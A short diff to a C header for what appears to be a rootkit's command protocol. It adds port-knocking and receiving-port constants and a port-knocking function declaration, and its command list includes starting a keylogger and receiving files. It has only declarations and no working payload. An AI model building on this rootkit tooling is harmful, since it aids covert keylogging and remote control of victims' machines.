@@ -1,12 +1,16 @@
 #ifndef ROOTKIT_PROTOCOL_H
 #define ROOTKIT_PROTOCOL_H
 
-#include "utils.h"
 #include <stddef.h>
 #include <stdint.h>
+#include <stdbool.h>
+
+// Forward declaration to avoid circular dependency
+struct server_options;
 
 #define COMMAND_TRIGGER_THRESHOLD 2
-
+#define RECEIVING_PORT 8080
+#define PORT_KNOCKING_PORT 30
 
 enum command_codes {
     START_KEYLOGGER = 0x01,
@@ -55,6 +59,8 @@ typedef struct {
 //     { RECEIVE_FILE, handle_receive_file },
 //     { 0, NULL }
 // };
+
+void initiate_port_knocking(struct server_options * server_options);
 
 // Keylogger
 void send_start_keylogger(int fd);
